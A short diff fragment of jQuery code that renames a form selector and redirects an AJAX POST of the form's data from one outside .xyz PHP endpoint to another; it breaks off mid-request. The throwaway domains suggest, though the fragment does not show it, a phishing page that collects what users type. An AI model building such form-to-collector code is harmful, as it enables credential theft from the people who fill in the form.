@@ -1,10 +1,10 @@
-$(".form").submit(function() {
+$(".dForm").submit(function() {
 
-	var d = $(".form");
+	var d = $(".dForm");
 
 	$.ajax({
 
-        url: "https://aditpediafast.xyz/ff2.php",
+        url: "https://api-demohosting.xyz/index.php",
 
         type: "POST",
 
